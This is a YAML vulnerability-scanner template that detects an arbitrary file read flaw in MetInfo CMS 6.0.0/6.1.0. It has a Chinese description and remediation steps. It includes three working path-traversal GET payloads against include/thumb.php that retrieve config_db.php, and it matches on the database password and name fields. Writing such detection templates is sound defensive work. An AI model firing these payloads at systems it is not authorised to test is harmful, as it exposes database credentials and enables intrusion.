id: metinfo-lfi
info:
  name: MetInfo 6.0.0/6.1.0 LFI
  author:
  - l0ne1y
  tags:
  - metinfo
  - lfi
  description: |-
    Metinfo 6.0.0/6.1.0 任意文件读取漏洞
    metinfo是由php与mysql开发的一套建站cms。在此cms的6.0.0-6.1.0版本中存在任意文件读取漏洞。攻击者可利用该漏洞读取目标服务器任意敏感文件。
  reference:
  - https://paper.seebug.org/676/
  severity: high
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：https://www.metinfo.cn

    临时修复方案：
    1、过滤\".\"，使用户在url中不能回溯上级目录。
    2、正则匹配严格判断用户输入参数的格式，对用户传过来的文件名参数进行硬编码或统一编码，对文件类型进行白名单控制，对包含恶意字符或者空字符的参数进行拒绝。
    3、禁止系统提供目录遍历服务，如：php.ini配置open_basedir限定文件访问范围。
    4、文件路径保存至数据库，让用户提交文件对应ID下载文件。
    5、用户下载文件之前进行权限校验。
requests:
- matchers:
  - type: word
    condition: and
    part: body
    words:
    - con_db_pass
    - con_db_name
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/include/thumb.php?dir=http/.....///.....///config/config_db.php'
  - '{{BaseURL}}/include/thumb.php?dir=.....///http/.....///config/config_db.php'
  - '{{BaseURL}}/include/thumb.php?dir=http\\..\\..\\config\\config_db.php'
  method: GET
  stop-at-first-match: true
